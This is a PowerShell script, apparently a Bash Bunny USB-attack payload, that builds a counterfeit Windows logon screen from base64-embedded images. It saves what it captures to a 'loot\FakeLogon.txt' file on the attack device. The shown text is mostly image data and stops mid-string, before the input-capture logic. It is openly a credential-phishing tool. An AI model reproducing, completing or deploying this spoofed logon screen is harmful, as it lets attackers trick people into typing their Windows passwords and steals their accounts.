﻿[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms");
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing");

#Path where loot is saved
$loot = ((gwmi win32_volume -f 'label=''BashBunny''').Name + 'loot\FakeLogon.txt'); 

$Screen = [System.Windows.Forms.Screen]::PrimaryScreen;
$blanks = [System.Collections.ArrayList]::new();

$Width  = $Screen.Bounds.Width;  
$Height  = $Screen.Bounds.Height;

# half the width of the primary screen for centering
$W = ($Width / 2);
$H = ($Height / 2);
 
<#
# Images
# Below are 9 images that have been convert to base64.
# To get the originals:
# $Img = [System.Drawing.Image]::FromStream([System.IO.MemoryStream][System.Convert]::FromBase64String('<Base64String>'));
# $Img.Save('<FilePath>'); 
#
# If you do not wish to use the Base64 encoded images.
# you could have the files on the bunny and do something like this:
# $BGImg = [System.Drawing.Image]::FromFile(<PathToBunny>"bg.jpg");
# or if you have web hosting or a http server runing on the bunny then you can do something like:
# $R = Invoke-WebRequest 'https://<MyURL/IPAddress>/bg.jpg'; 
# $BGImg = [System.Drawing.Image]::FromStream($R.RawContentStream); 
#> 
<#
# Backgroud Image
# This image should be found at C:\Windows\Web\Screen
# File format: Jpg
#>


<#
# Blured Backgroud Image
# File format: Jpg
#>


<#
# User Image - a circle on a semicircle
# This image can be found at: %ProgramData%\Microsoft\User Account Pictures\
# File format: Png
#>
$UserImg = [System.Drawing.Image]::FromStream([System.IO.MemoryStream][System.Convert]::FromBase64String('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'));


<#
# Ease of Access Image
# Dashed circle with two arrows in the top right quarter
# File format: Png
#>
$AccImg = [System.Drawing.Image]::FromStream([System.IO.MemoryStream][System.Convert]::FromBase64String('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'));


<#
# Power Button Image
# 
# File format: Png
#>
$PwdImg = [System.Drawing.Image]::FromStream([System.IO.MemoryStream][System.Convert]::FromBase64String('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